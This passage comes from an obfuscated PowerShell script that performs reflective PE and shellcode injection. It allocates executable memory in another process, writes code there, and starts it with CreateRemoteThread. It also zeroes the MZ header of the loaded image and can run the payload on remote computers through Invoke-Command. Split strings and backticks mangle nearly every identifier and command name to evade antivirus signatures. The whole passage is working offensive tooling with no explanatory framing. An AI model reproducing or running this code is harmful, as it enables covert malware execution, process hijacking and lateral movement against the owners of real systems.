				    &("{4}{1}{2}{3}{0}"-f'mory','ite','-Byte','sToMe','Wr') -Bytes ${ca`Lld`lLMA`IN`SC2} -MemoryAddress ${sC`P`smem}
				    ${Scp`s`Mem} = &("{1}{2}{0}{4}{3}" -f 'dIn','Add-Sig','ne','signed','tAsUn') ${S`cPs`MeM} (${cAlLdllM`A`INS`C2}."L`ENgtH")
				     ${z`FI`2WH}::("{1}{3}{0}{2}"-f 'tureToPt','S','r','truc').Invoke(${Dl`Lmai`NPtR}, ${s`c`PSMem}, ${Fa`lsE})
				    ${S`CP`SMeM} = &("{4}{3}{0}{2}{1}"-f'dI','igned','ntAsUns','Signe','Add-') ${scps`m`em} (${p`TRS`Ize})
				    &("{1}{3}{0}{2}"-f'ToMem','Wri','ory','te-Bytes') -Bytes ${cAlLd`LL`Mai`NSc3} -MemoryAddress ${SC`PSM`em}
				    ${SCpSM`em} = &("{2}{0}{1}{5}{4}{3}"-f 'i','gne','Add-S','gned','Unsi','dIntAs') ${SCpS`Mem} (${CalLd`lLmA`iNs`c3}."lEnG`TH")
				
				    ${r`scAdDR} = ${wiN32`FUnctio`NS}."Vi`Rt`UAlalLo`cex"."INV`oke"(${REMoTE`PR`oc`H`A`NDLE},   (&("{0}{1}{2}" -f 'GET-va','RIA','Ble')  ("{0}{1}"-f'Bq','ta') -VaLuEOn)::"ze`Ro", [UIntPtr][UInt64]${Sc`le`N`gTH}, ${wIn`32CON`s`TanTs}."m`e`M_C`oMMiT" -bor ${Win`32`co`NsT`Ants}."Mem_reSe`R`VE", ${wi`N`32cONstantS}."paGE_E`x`ecutE`_rE`AdwRITe")
				    if (${RsC`A`Ddr} -eq  ${b`QtA}::"Z`Ero")
				    {
					    Throw ("{12}{5}{14}{1}{13}{9}{8}{10}{2}{0}{7}{15}{3}{11}{6}{4}"-f' pr','mem','emote','s for s','ode','o allocat','llc','o','n the',' i',' r','he','Unable t','ory','e ','ces')
				    }
				
				    ${suC`c`esS} = ${win`32FuNC`T`IOnS}."WRiTE`Pr`ocESSMe`m`o`RY"."Invo`KE"(${REM`o`TeP`ROc`HAN`Dle}, ${Rsca`DdR}, ${SC`pS`M`em`ORIginAL}, [UIntPtr][UInt64]${SCL`eN`Gth}, [Ref]${N`UM`BYtESw`RItTeN})
				    if ((${S`UcC`ESs} -eq ${F`A`lsE}) -or ([UInt64]${n`UmbYtE`sw`R`itTeN} -ne [UInt64]${s`CLenG`Th}))
				    {
					    Throw ("{3}{8}{4}{2}{0}{6}{1}{5}{7}"-f'hellcode to remo','ocess me','s','Unable to w','e ','m','te pr','ory.','rit')
				    }

				    ${RtHrEadh`A`ND`lE} = &("{3}{0}{5}{4}{1}{2}"-f'voke-Crea','mo','teThread','In','e','teR') -ProcessHandle ${rEmOtEp`Rocha`N`DLE} -StartAddress ${RSC`A`dDr} -Win32Functions ${wi`N3`2FunctI`o`NS}
				    ${R`es`ULT} = ${W`In`32F`UnC`TionS}."W`AITFOr`s`i`NGLe`oBjeCT"."i`NvokE"(${r`ThREa`D`haN`DLE}, 20000)
				    if (${Re`SU`lT} -ne 0)
				    {
					    Throw ("{11}{15}{0}{7}{9}{4}{13}{3}{14}{2}{16}{10}{1}{8}{6}{12}{5}" -f 'R',' ','tProcA','o ca','eThread','d.','l','em','fai','ot','ess','Call','e',' t','ll Ge',' to Create','ddr')
				    }
				
				    ${wI`N32`Fu`NCTio`NS}."vIr`TUalF`R`EeeX"."In`VOke"(${Re`MOTePrOChA`N`D`le}, ${rscAd`DR}, [UIntPtr][UInt64]0, ${w`In32CO`NsT`AntS}."m`Em_re`leASE") | &("{0}{1}" -f'Ou','t-Null')
			    }
		    }
		    elseif (${pE`i`NFO}."FIlE`Ty`Pe" -ieq "EXE")
		    {
			    
			    [IntPtr]${exEdonEByt`E`pTr} =  ${zf`i`2wh}::("{0}{1}{3}{2}"-f'All','oc','Global','H').Invoke(1)
			     ( &("{0}{2}{1}"-f 'vArIAb','e','l')  ('zFi2'+'wH')  )."V`ALue"::("{0}{3}{1}{2}" -f 'W','Byt','e','rite').Invoke(${exE`DoNEBy`Te`pTR}, 0, 0x00)
			    ${OvEr`Wr`IT`TENM`eMiNfo} = &("{1}{4}{3}{0}{5}{2}" -f 'cti','Up','s','Fun','date-Exe','on') -PEInfo ${PEI`N`Fo} -Win32Functions ${WIn3`2`FUNctiO`NS} -Win32Constants ${WIn32`c`oNST`ANtS} -ExeArguments ${exea`RGs} -ExeDoneBytePtr ${ExEdoneb`YTeP`Tr}

			    
			    
			    [IntPtr]${e`XEm`AiNPTR} = &("{3}{0}{4}{5}{2}{1}" -f'ed','d','ne','Add-Sign','Int','AsUnsig') (${p`E`InFO}."P`eh`AndlE") (${pEi`N`Fo}."i`ma`ge`_nT_HE`ADeRS"."o`PTIoNAL`heAD`ER"."AdDrEs`s`oFE`N`Tr`yPoINT")
			    &("{3}{1}{0}{2}" -f'rb','Ve','ose','Write-') ('C'+'all '+'EX'+'E '+'Main'+' '+'fun'+'ctio'+'n. '+'Addre'+'ss:'+' '+"$ExeMainPtr. "+'C'+'r'+'eating '+'thr'+'ead'+' '+'fo'+'r '+'t'+'he '+'EXE'+' '+'t'+'o '+'run'+' '+'in'+'.')

			    ${WiN3`2Fu`N`ctIONs}."CR`eAtEt`hR`Ead"."IN`VoKe"( ${b`qta}::"ze`Ro",   ${bQ`TA}::"z`ERo", ${E`xEM`AIN`pTr},  (&("{2}{0}{1}"-f 'ArIaBl','e','v')  ("{1}{0}" -f 'ta','bq'))."vaL`UE"::"z`Ero", ([UInt32]0), [Ref]([UInt32]0)) | &("{1}{0}{2}" -f 'Nu','Out-','ll')

			    while(${Tr`Ue})
			    {
				    [Byte]${t`h`Re`ADdone} =   ( &("{1}{2}{0}" -f'e','V','AriABL')  ("{1}{0}"-f'FI2wH','Z') )."val`Ue"::("{1}{0}"-f'adByte','Re').Invoke(${E`X`EDOne`BytePtr}, 0)
				    if (${THR`eadD`ONE} -eq 1)
				    {
					    &("{3}{0}{4}{1}{2}"-f 'rayOfMem','ddres','ses','Copy-Ar','A') -CopyInfo ${O`VE`RWR`ittEN`memiN`Fo} -Win32Functions ${W`i`N32`FuNcTiO`NS} -Win32Constants ${WIn`32co`NsTaN`TS}
					    &("{1}{0}{2}" -f 'rite-Verbos','W','e') ("{4}{3}{0}{1}{2}"-f 'hread has c','om','pleted.','XE t','E')
					    break
				    }
				    else
				    {
					    &("{2}{3}{1}{0}"-f '-Sleep','art','S','t') -Seconds 1
				    }
			    }
		    }
		
		    return @(${PEI`Nfo}."P`e`HANdlE", ${Ef`FECtI`VEPE`haN`D`Le})
	    }
	
	
	    Function in`VOKE-Me`M`orYfreE`L`IBR`ARy
	    {
		    Param(
		    [Parameter(POSITiOn=0, mandAtORY=${T`Rue})]
		    [IntPtr]
		    ${P`ehAN`dLe}
		    )
		
		    
		    ${wIN3`2C`on`s`TANtS} = &("{2}{3}{1}{4}{0}"-f'nts','Cons','Ge','t-Win32','ta')
		    ${W`i`N32Fu`NCTIons} = &("{0}{1}{2}{4}{3}"-f'Get-W','i','n32Fu','tions','nc')
		    ${WIN`32`TY`PEs} = &("{2}{3}{0}{1}{4}"-f'-W','i','Ge','t','n32Types')
		
		    ${pe`INFo} = &("{3}{1}{4}{0}{5}{2}" -f'ail','ED','fo','Get-P','et','edIn') -PEHandle ${pe`h`ANdLe} -Win32Types ${wiN3`2t`yp`Es} -Win32Constants ${wiN32`con`St`AnTS}
		
		    
		    if (${peI`NFO}."iM`Ag`E_N`T_heAD`eRs"."oPTI`O`NaL`heaDer"."imPoR`T`TablE"."s`iZE" -gt 0)
		    {
			    [IntPtr]${IM`poRTdeSCRi`P`TorPtR} = &("{3}{1}{4}{0}{2}"-f 'AsUnsigne','d-S','d','Ad','ignedInt') ([Int64]${p`EI`NFO}."Peh`AnD`lE") ([Int64]${pe`INfo}."ImaG`E`_Nt_`hEAders"."opTI`ONaL`h`eADEr"."IMP`OrTtab`le"."vIRT`UaLAD`dr`Ess")
			
			    while (${t`RUe})
			    {
				    ${IMP`Or`TdEs`C`RIpToR} =   (&("{0}{2}{1}" -f'gET-V','E','AriaBL') ("zfI"+"2"+"WH"))."VAL`Ue"::"p`Trtos`T`Ructure"(${impO`RTdEsC`RiPto`R`Ptr}, [Type]${WI`N32`T`ypES}."ImAG`e_IMpoRt_`DESC`R`I`PToR")
				
				    
				    if (${imPO`Rt`d`E`S`cRiPtoR}."CHArA`CtER`IStIcS" -eq 0 `
						    -and ${i`mpor`T`DEsCRi`p`ToR}."f`irstT`h`UNK" -eq 0 `
						    -and ${iMPoR`TD`eScRIPT`OR}."f`oR`wArd`erCHaIn" -eq 0 `
						    -and ${I`mPo`RT`desC`RIptOR}."N`Ame" -eq 0 `
						    -and ${im`pOrT`d`es`crIPtOR}."t`iMEd`AtesTAmp" -eq 0)
				    {
					    &("{2}{0}{1}" -f 'r','bose','Write-Ve') ("{8}{9}{4}{5}{7}{0}{10}{1}{6}{3}{2}" -f 'ing th','ed by','E',' P',' un','lo',' the','ad','Do','ne','e libraries need')
					    break
				    }

				    ${imPOrTdl`Lp`A`Th} =   ( &("{0}{1}" -f 'D','iR') ('vArIa'+'Bl'+'E'+':'+'ZFi2wh') )."VA`LUE"::"ptRT`OSt`Ri`Ng`ANsi"((&("{3}{2}{1}{4}{0}{5}" -f 'gne','ns','dIntAsU','Add-Signe','i','d') ([Int64]${pei`NFo}."PEHAn`D`Le") ([Int64]${iMpor`T`D`esc`RIpt`or}."n`AmE")))
				    ${im`pORtDLL`HAN`D`Le} = ${WIn3`2fUNct`I`ONs}."g`EtmODuLeha`N`DLE"."INVO`kE"(${Im`PORTD`llP`ATh})

				    if (${IMp`O`RtD`llhAnDle} -eq ${nu`LL})
				    {
					    &("{2}{0}{1}{3}"-f'Warn','in','Write-','g') ('Error'+' '+'ge'+'t'+'ting '+'DLL'+' '+'handl'+'e '+'i'+'n '+'Memo'+'ryF'+'re'+'eLibrary, '+'DLLName'+': '+"$ImportDllPath. "+'Co'+'nti'+'n'+'uing '+'anywa'+'ys') -WarningAction ("{2}{0}{1}" -f 'nt','inue','Co')
				    }
				
				    ${SU`ccesS} = ${wi`N32fU`NCt`IONs}."FrE`El`iBR`ARy"."in`Vo`kE"(${i`M`pOrt`d`LlHANDle})
				    if (${S`UCc`esS} -eq ${FAl`SE})
				    {
					    &("{1}{2}{0}" -f'rning','Writ','e-Wa') ('Un'+'abl'+'e '+'t'+'o '+'free'+' '+'l'+'ibrary: '+"$ImportDllPath. "+'C'+'ontinui'+'ng '+'any'+'way'+'s.') -WarningAction ("{0}{1}{2}"-f'Con','ti','nue')
				    }
				
				    ${ImpO`RtD`e`sCrIpTORP`TR} = &("{1}{0}{3}{5}{4}{2}"-f '-Si','Add','igned','gned','sUns','IntA') (${Im`POrTDeSC`RiP`TorpTR}) ( ( &("{3}{1}{2}{0}"-f 'Ble','a','rIA','geT-v')  ("Z"+"f"+"I2wh") )."VaL`Ue"::"s`Ize`Of"([Type]${Win`3`2tY`PeS}."I`ma`g`e`_imPOR`T`_DeScrIptOR"))
			    }
		    }
		
		    
		    &("{0}{2}{3}{1}"-f 'Write','bose','-V','er') ("{4}{5}{0}{14}{11}{1}{6}{3}{8}{9}{10}{15}{7}{2}{12}{13}" -f 'lli','mai',' b','o ','C','a','n s','is','t','he DLL knows i','t','dll','eing u','nloaded','ng ',' ')
		    ${dLl`ma`i`NptR} = &("{0}{3}{2}{1}{4}{5}"-f 'Add-Sig','tA','In','ned','sUn','signed') (${pEI`N`Fo}."PEhAn`DLE") (${Pe`IN`Fo}."I`MAG`e_nT_`hE`ADErs"."O`PtiON`AlHEa`dER"."addRE`SSOFEN`TRYP`O`int")
		    ${Dllm`AINde`L`e`gaTE} = &("{3}{1}{4}{2}{0}"-f 'ype','Dele','T','Get-','gate') @([IntPtr], [UInt32], [IntPtr]) ([Bool])
		    ${DlL`mAin} =  ( &("{1}{0}{2}{3}"-f 'chil','GeT-','di','tEm') ("vArI"+"Ab"+"le"+":ZFI"+"2WH")  )."V`AlUe"::("{6}{1}{4}{2}{3}{7}{0}{5}"-f'nctionP','tDelega','o','rF','teF','ointer','Ge','u').Invoke(${dLLMaI`Np`TR}, ${dLl`Mai`Nd`E`lEGaTe})
		
		    ${DlL`Ma`iN}."iNV`Oke"(${p`E`INfo}."P`e`hANDle", 0,  ( &("{1}{0}" -f 'IR','d')  ("{1}{2}{3}{0}{4}"-f 'bQt','va','RiABLe',':','a'))."vAl`Ue"::"z`ero") | &("{1}{0}" -f'll','Out-Nu')
		
		
		    ${suc`cesS} = ${wi`N3`2`FuNCTIOnS}."VI`R`T`UaLFRee"."i`NvoKE"(${P`E`HandLE}, [UInt64]0, ${WIN32`cONst`A`N`TS}."MeM_R`eL`eAse")
		    if (${succ`ESS} -eq ${f`A`lsE})
		    {
			    &("{2}{0}{1}"-f'nin','g','Write-War') ((("{9}{6}{11}{2}{5}{3}{0}{7}{12}{1}{13}{10}{8}{4}" -f'E{0','emory','alFree',' the P','s.',' on',' to cal','}s','uing anyway','Unable','n','l Virtu',' m','. Conti')) -F  [cHar]39) -WarningAction ("{0}{1}{2}" -f 'Con','tin','ue')
		    }
	    }


	    Function m`AIN
	    {
		    ${WIn`32`FuNC`Tio`NS} = &("{4}{1}{2}{0}{3}" -f'on','t-Win32Func','ti','s','Ge')
		    ${win32T`Yp`es} = &("{0}{1}{4}{3}{2}"-f'G','et-Wi','s','Type','n32')
		    ${wI`N3`2cON`STaNtS} =  &("{0}{1}{4}{3}{2}" -f'G','e','tants','2Cons','t-Win3')
		
		    ${rEMote`p`ROc`haNdLe} =  ( &("{0}{1}" -f 'gc','i') ("{3}{1}{2}{0}" -f 'Ta','bLe',':Bq','varIa') )."v`ALUe"::"Z`eRO"
	
		    
		    if ((${P`ROCid} -ne ${nU`lL}) -and (${PROC`iD} -ne 0) -and (${PrOc`Na`mE} -ne ${n`Ull}) -and (${P`ROCN`AmE} -ne ""))
		    {
			    Throw ((("{5}{2}{3}{6}{8}{9}{4}{0}{10}{1}{7}" -f'e, choose','r','s','upply ','ocNam','CanQXut ','a ',' the other','ProcId and ','Pr',' one o'))."r`ePL`Ace"('QXu',[stRINg][chaR]39))
		    }
		    elseif (${P`RocNaME} -ne ${n`ULL} -and ${pr`OCN`AME} -ne "")
		    {
			    ${p`RO`c`ESsES} = @(&("{0}{2}{3}{1}" -f'Ge','Process','t','-') -Name ${Proc`N`A`mE} -ErrorAction ("{2}{4}{1}{3}{0}" -f 'e','yConti','Sil','nu','entl'))
			    if (${procE`S`SeS}."C`ounT" -eq 0)
			    {
				    Throw ((('C'+'a'+'novzt'+' ')  -REPLACE ([cHar]111+[cHar]118+[cHar]122),[cHar]39)+'fin'+'d '+'proces'+'s'+' '+"$ProcName")
			    }
			    elseif (${p`R`OcESS`es}."C`oUNT" -gt 1)
			    {
				    ${Pr`oci`Nfo} = &("{2}{0}{1}"-f 'Proce','ss','Get-') | &("{0}{1}" -f 'wh','ere') { ${_}."N`AME" -eq ${P`ROCnA`me} } | &("{0}{3}{2}{1}" -f'Selec','ct','bje','t-O') ("{2}{3}{1}{0}"-f'ame','sN','Proc','es'), ('Id'), ("{0}{1}{2}" -f'Sessio','nI','d')
				    &("{1}{0}{2}" -f '-','Write','Output') ${P`RO`CInfo}
				    Throw ('Mo'+'re '+'tha'+'n '+'o'+'ne '+'i'+'nst'+'ance '+'of'+' '+"$ProcName "+'fou'+'nd,'+' '+'pl'+'ease '+'spec'+'ify '+'th'+'e '+'pro'+'cess'+' '+'I'+'D '+'t'+'o '+'i'+'n'+'ject '+'in'+' '+'t'+'o.')
			    }
			    else
			    {
				    ${PrO`CID} = ${PR`oceS`s`es}[0]."I`d"
			    }
		    }
		
		    
		    
    
    
    
    
    
		
		    if ((${proC`Id} -ne ${N`Ull}) -and (${Pr`oC`Id} -ne 0))
		    {
			    ${r`E`MotEPRo`cHaN`DLE} = ${wIN`32fu`NctIO`NS}."oPEnpRo`Ce`Ss"."inV`Oke"(0x001F0FFF, ${FAl`SE}, ${P`R`OCiD})
			    if (${REmo`T`EPrOc`HAndlE} -eq  (&("{1}{0}"-f'R','Di')  ('VArIAble'+':b'+'qT'+'A') )."VaL`UE"::"Z`ErO")
			    {
				    Throw (('Could'+'ncVe'+'t'+' ')."Re`pLACE"('cVe',[STriNg][CHAr]39)+'o'+'bta'+'in '+'th'+'e '+'handl'+'e '+'f'+'or '+'p'+'rocess'+' '+'ID'+': '+"$ProcId")
			    }
			
			    &("{2}{1}{0}" -f'se','rite-Verbo','W') ("{9}{1}{7}{6}{8}{0}{4}{2}{5}{3}" -f 'he ','he han','emote',' in to','r',' process to inject','e fo','dl','r t','Got t')
		    }
		

		    
		    &("{3}{0}{2}{1}"-f'Verbo','e','s','Write-') ("{4}{3}{6}{0}{1}{7}{5}{2}{8}"-f 'oke-Me','mory','rar','in','Call','Lib','g Inv','Load','y')
		    ${PEha`NdLe} =  ${bQ`Ta}::"ze`Ro"
		    if (${rEmote`pR`Oc`HaN`dle} -eq  ${B`QTa}::"Z`ERO")
		    {
			    ${pe`lO`AdEdi`NFO} = &("{0}{6}{5}{4}{3}{1}{2}"-f 'Inv','Libra','ry','emoryLoad','-M','ke','o') -PEBytes ${pEby`TES} -ExeArgs ${Ex`Ea`RgS}
		    }
		    else
		    {
			    ${pELoAded`i`NFO} = &("{0}{1}{4}{3}{2}"-f'Inv','o','LoadLibrary','ry','ke-Memo') -PEBytes ${p`ebYT`es} -ExeArgs ${E`xeA`Rgs} -RemoteProcHandle ${reM`O`TeprOc`HA`Ndle}
		    }
		    if (${pEl`oa`dEdI`NFo} -eq  ( &("{1}{0}"-f 'CI','g') ("{0}{2}{1}{3}" -f 'VaRIabL','b','e:','qta')  )."v`ALUE"::"ze`RO")
		    {
			    Throw ("{5}{4}{8}{7}{1}{2}{3}{6}{0}"-f' NULL',', ','h','andle return',' to','Unable','ed is','load PE',' ')
		    }
		
		    ${pEHaN`d`le} = ${P`EL`oaDediNFO}[0]
		    ${rem`otePehAnD`lE} = ${PElOA`dE`dinFo}[1] 
		
		
		    
		    ${Pein`Fo} = &("{0}{1}{3}{2}" -f'Ge','t-PEDeta','ledInfo','i') -PEHandle ${pE`HaN`DLe} -Win32Types ${WIn`32ty`PES} -Win32Constants ${wiN`32cOn`STANTs}
		    if ((${p`e`iNfO}."f`ILeT`yPE" -ieq "DLL") -and (${reM`otEP`R`ochaN`d`Le} -eq   (  &("{0}{1}{2}"-f'va','ria','bLe')  ("{1}{0}"-f'QtA','b')  )."VAl`Ue"::"ZE`RO"))
		    {
			    
			    
			    
	            switch (${funCR`Et`URnty`pE})
	            {
	                ("{1}{0}"-f 'ing','WStr') {
	                    &("{0}{1}{3}{2}"-f 'Wr','ite','erbose','-V') ("{9}{2}{8}{6}{7}{4}{3}{1}{5}{0}"-f'ype','etur','g funct',' r','tring','n t','h ','WS','ion wit','Callin')
				        [IntPtr]${ws`TRINgf`UnC`ADdR} = &("{3}{0}{2}{4}{1}"-f'oryProcAd','s','dre','Get-Mem','s') -PEHandle ${Pe`hA`NDlE} -FunctionName ("{3}{2}{1}{0}" -f'c','Fun','String','W')
				        if (${W`stRINGfun`CAdDr} -eq  ${B`qTa}::"ze`RO")
				        {
					        Throw ((("{5}{1}{4}{6}{3}{2}{0}" -f'on address.','ldnG','i',' find funct','b','Cou','nt'))."rEp`lacE"(([ChAR]71+[ChAR]98+[ChAR]110),[StRIng][ChAR]39))
				        }
				        ${Ws`T`Ri`NG`FUNCDeL`EgAtE} = &("{2}{1}{0}{3}"-f'e','Del','Get-','gateType') @() ([IntPtr])
				        ${WsTri`NG`FunC} =  ( &("{0}{2}{1}{3}"-f 'G','L','Et-chI','dItem')  ("{0}{1}{2}" -f'v','aRIABL','E:zfi2Wh'))."VaL`UE"::("{5}{4}{0}{1}{3}{2}"-f 'e','gateForFunct','ointer','ionP','el','GetD').Invoke(${wstrIngfUn`c`A`d`dR}, ${ws`Tr`iNgF`UnC`DELE`gAtE})
				        [IntPtr]${OUTP`U`TPtR} = ${w`stri`NGfUNc}."i`NvoKe"()
				        ${o`UTP`UT} =  (  &("{0}{2}{1}"-f 'GET-v','ble','Aria') ("ZFi"+"2Wh") )."vAL`UE"::("{3}{1}{4}{0}{2}"-f'gU','tr','ni','PtrToS','in').Invoke(${oUTPu`T`ptR})
				        &("{0}{2}{1}"-f 'Wr','-Output','ite') ${O`UTP`UT}
	                }

	                ("{2}{0}{1}"-f 'i','ng','Str') {
	                    &("{1}{2}{0}"-f 'rbose','Wri','te-Ve') ("{3}{4}{0}{1}{5}{2}{6}" -f'ng functio','n with String ret','p','C','alli','urn ty','e')
				        [IntPtr]${s`T`RingFUNcAdDr} = &("{1}{2}{3}{0}{4}" -f 'oryProcAddr','G','et','-Mem','ess') -PEHandle ${p`E`hA`NDlE} -FunctionName ("{0}{1}{2}" -f 'S','trin','gFunc')
				        if (${sT`RiNG`FUnCad`dR} -eq  ( &("{0}{1}" -f'GEt','-item') ("VaRi"+"ABL"+"e:"+"BqTA") )."V`ALUe"::"Z`ero")
				        {
					        Throw ((("{8}{2}{7}{6}{4}{0}{5}{1}{3}"-f'd fun','ddress','o','.','ePt fin','ction a','N','uldn','C'))."REpLA`Ce"(([CHaR]78+[CHaR]101+[CHaR]80),[sTRIng][CHaR]39))
				        }
				        ${STr`In`gFUnC`DelE`GA`Te} = &("{0}{1}{2}{3}"-f 'Get-','Delegat','eT','ype') @() ([IntPtr])
				        ${St`RINGF`U`NC} =   (  &("{0}{2}{1}" -f'Va','abLE','Ri')  ("{2}{1}{0}"-f'h','FI2W','z'))."V`ALUE"::("{3}{5}{4}{0}{1}{2}" -f'teForF','unctio','nPointer','Get','ega','Del').Invoke(${sTriNgFun`C`A`DDr}, ${Str`INGFuncDE`le`gaTE})
				        [IntPtr]${O`UT`PUTpTR} = ${StRi`NGF`UNc}."In`VOkE"()
				        ${o`U`TPuT} =  ${Z`FI`2wh}::("{1}{0}{2}{3}{4}"-f 'o','PtrT','Strin','gAn','si').Invoke(${Ou`T`PuTpTr})
				        &("{1}{3}{2}{0}"-f 'tput','Wr','-Ou','ite') ${Out`P`Ut}
	                }

	                ("{0}{1}"-f 'V','oid') {
	                    &("{1}{0}{2}{3}"-f'r','Write-Ve','bo','se') ("{0}{1}{6}{5}{10}{9}{4}{7}{2}{3}{8}" -f 'Ca','ll',' ','Void return typ','ion',' ','ing',' with','e','ct','fun')
				        [IntPtr]${VoidfuNc`A`d`DR} = &("{4}{5}{1}{6}{3}{2}{0}"-f'ddress','or','cA','o','G','et-Mem','yPr') -PEHandle ${P`Eha`Nd`lE} -FunctionName ("{1}{2}{0}" -f 'Func','Vo','id')
				        if (${v`OIDF`UnC`ADDR} -eq  (  &("{0}{2}{1}" -f 'vAR','LE','IaB') ("{0}{1}" -f'BqT','A') -vAl )::"z`eRo")
				        {
					        Throw ((("{5}{6}{0}{2}{4}{3}{1}"-f'n','ss.','ction ad','e','dr','Co','uldn{0}t find fu'))  -f [CHaR]39)
				        }
				        ${vO`iDFu`NcDel`eGATE} = &("{1}{0}{3}{2}"-f'eT','Get-Delegat','e','yp') @() ([Void])
				        ${v`oI`dfu`NC} =  (&("{0}{1}{2}" -f 'geT-vAR','IaB','Le')  ("{1}{0}"-f '2wh','zFI')  -va )::("{5}{1}{0}{3}{2}{4}{8}{6}{7}" -f'De','et','F','legateFor','unc','G','nt','er','tionPoi').Invoke(${void`FuNC`AD`DR}, ${voI`DFuNc`D`ElegaTE})
				        ${Vo`iDFU`NC}."iNv`oKe"() | &("{2}{1}{0}" -f 'l','ut-Nul','O')
	                }
	            }
			    
			    
			    
		    }
		    
		    elseif ((${pe`inFO}."f`iLETY`pE" -ieq "DLL") -and (${rem`OtE`ProchA`NDle} -ne  ( &("{0}{1}{2}" -f 'GEt-V','AR','IAblE')  ("bqt"+"A")  -vALUeoNLy )::"Z`eRo"))
		    {
			    ${vOi`df`U`NCAdDR} = &("{2}{0}{6}{3}{5}{4}{1}"-f'Me','ss','Get-','ProcAdd','e','r','mory') -PEHandle ${pehAn`dle} -FunctionName ("{0}{1}{2}" -f'Voi','dFun','c')
			    if ((${vOIDF`U`N`CA`DDr} -eq ${n`UlL}) -or (${vO`IdFun`Ca`dDR} -eq  ( &("{0}{2}{1}"-f 'VaR','E','IABl')  ("{1}{0}" -f 'tA','BQ') -VALu )::"ZE`RO"))
			    {
				    Throw ((("{0}{6}{5}{3}{4}{2}{1}"-f 'VoidF',' the DLL','n',' found ','i','couldn6rct be','unc '))."rE`pla`cE"('6rc',[stRIng][CHar]39))
			    }
			
			    ${voiDfU`NC`AdDr} = &("{4}{3}{2}{0}{1}"-f'nsign','ed','tAsU','SignedIn','Sub-') ${V`O`iDf`UnCadDr} ${PehA`N`DLE}
			    ${VOIDFUn`ca`d`dr} = &("{6}{2}{0}{3}{1}{4}{5}"-f 'In','nsig','d-Signed','tAsU','ne','d','Ad') ${VO`idfunCA`Ddr} ${rEmOtEp`Eh`ANDLE}
			
			    
			    ${rThR`E`A`dHANd`le} = &("{1}{0}{3}{2}{5}{4}"-f'nvoke','I','eRem','-Creat','Thread','ote') -ProcessHandle ${rE`M`Ot`ep`R`oChANDLe} -StartAddress ${VoId`FuNc`Ad`dR} -Win32Functions ${W`IN32F`UNc`Ti`ons}
		    }
		
		    
		    if (${ReMO`T`Ep`ROcH`And`le} -eq   ${bQ`TA}::"z`eRO")
		    {
			    &("{2}{3}{4}{1}{0}" -f'ary','emoryFreeLibr','In','voke-','M') -PEHandle ${p`eh`ANdLE}
		    }
		    else
		    {
			    
			    ${S`UCc`esS} = ${win32`FUnC`T`IONs}."Vir`TUALf`REE"."I`NVOKe"(${P`eHaNd`lE}, [UInt64]0, ${WIN32`cOn`Sta`N`TS}."mEm_r`eLe`ASe")
			    if (${sUcC`e`SS} -eq ${fa`LSe})
			    {
				    &("{2}{0}{1}"-f'War','ning','Write-') ((("{3}{11}{7}{4}{8}{13}{1}{18}{10}{5}{6}{2}{16}{15}{17}{9}{12}{14}{0}"-f'ys.','e',' PE7gR','Unable to ca','irt','h','e','l V','ua','u','on t','l','ing a','lFr','nywa','ry. ','s memo','Contin','e '))  -rePlAce  ([ChAr]55+[ChAr]103+[ChAr]82),[ChAr]39) -WarningAction ("{1}{0}{2}" -f 'nu','Conti','e')
			    }
		    }
		
		    &("{1}{4}{3}{0}{2}" -f'-V','W','erbose','te','ri') ("{1}{0}" -f 'ne!','Do')
	    }

	    &("{1}{0}"-f'n','Mai')
    }

    
    Function ma`In
    {
	    if ((${PSC`m`dlET}."Myi`NVO`Ca`TIon"."b`ounDPA`RAMeters"[("{1}{0}"-f'ug','Deb')] -ne ${N`Ull}) -and ${p`s`CmdlET}."Myin`VoCA`Ti`ON"."Bou`NDPAramETE`RS"[("{0}{1}"-f'Deb','ug')]."ISpr`ese`Nt")
	    {
		    ${d`ebU`gpREF`ErEnCe}  = ("{2}{0}{1}"-f'ontinu','e','C')
	    }
	
	    &("{3}{2}{1}{0}" -f 'bose','Ver','-','Write') ('PowerS'+'he'+'ll '+'Pr'+'oces'+'s'+'ID: '+"$PID")
	
	    [Byte[]]${pebY`T`es} = ${n`UlL}
	
        if ( (&("{1}{0}{2}" -f'Bl','gEt-VAria','E')  ('ZFi'+'2w'+'H') )."v`ALUE"::"s`IzEoF"([Type][IntPtr]) -eq 8)
        {
            ${pe`Byt`Es} = ${ByT`ES64}
        }
        else
        {
            ${P`eB`YtES} = ${B`Y`TES32}
        }
	
	    
	    ${E_Ma`g`ic} = (${PebY`TeS}[0..1] | &('%') {[Char] ${_}}) -join ''

        if (${e_m`Ag`ic} -ne 'MZ')
        {
            throw ("{3}{2}{1}{0}{7}{5}{8}{4}{6}" -f 't','o','n','PE is ','e','id','.',' a val',' PE fil')
        }

        
	    
        ${peB`y`TeS}[0] = 0
        ${P`EbyT`eS}[1] = 0
	
	    
	    if (${E`XEA`RgS} -ne ${NU`ll} -and ${eX`EaR`Gs} -ne '')
	    {
		    ${E`xeAR`Gs} = ('Refl'+'ective'+'Exe '+"$ExeArgs")
	    }
	    else
	    {
		    ${ExE`ArgS} = ("{1}{2}{0}"-f'e','Reflectiv','eEx')
	    }

	    if (${C`OmPU`TERNaME} -eq ${N`ULL} -or ${COmpuTe`RNA`Me} -imatch "^\s*$")
	    {
		    &("{3}{1}{0}{2}{4}"-f 'k','vo','e-Comma','In','nd') -ScriptBlock ${ReMOT`Es`cRip`T`BLo`ck} -ArgumentList @(${p`EbYT`ES}, ${fuN`c`REtURnT`yPE}, ${PRO`CID}, ${PROC`NA`mE})
	    }
	    else
	    {
		    &("{2}{3}{0}{1}{4}"-f'm','a','Invoke-','Com','nd') -ScriptBlock ${ReMOtEscr`I`PtbL`O`cK} -ArgumentList @(${pEBY`TES}, ${fuNcre`T`Urnt`yPe}, ${pR`Oc`ID}, ${pR`oC`NaME}) -ComputerName ${C`oMput`ERNa`me}
	    }
    }

    &("{0}{1}" -f 'Ma','in')
    }



    
	Function GeT-d`eLeG`AtET`ypE
	{
	    Param
	    (
	        [OutputType([Type])]
	        
	        [Parameter( POSiTIon = 0)]
	        [Type[]]
	        ${PA`RA`MeT`Ers} = (&("{1}{0}{2}" -f '-O','New','bject') ("{0}{1}"-f 'Typ','e[]')(0)),
	        
	        [Parameter( pOSiTion = 1 )]
	        [Type]
	        ${rE`TURN`Type} = [Void]
	    )

	    ${DOm`A`iN} =  (&("{0}{1}" -f 'GET-ITe','M')  ("VAR"+"iaBlE"+":b"+"92"))."Va`Lue"::"cURr`en`T`dOMAIn"
